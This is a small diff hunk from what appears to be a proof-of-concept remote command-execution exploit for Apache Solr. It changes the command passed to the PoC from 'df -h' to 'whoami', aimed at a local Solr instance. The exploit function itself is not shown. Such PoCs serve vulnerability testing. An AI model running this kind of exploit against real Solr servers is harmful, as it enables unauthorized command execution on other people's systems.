@@ -53,5 +53,5 @@ def poc(url, cmd):
 if __name__ == '__main__':
     # test 是core admin名称
     base_url = "http://127.0.0.1:8983/solr/test/"
-    command = 'df -h'
+    command = 'whoami'
     poc(base_url, command)
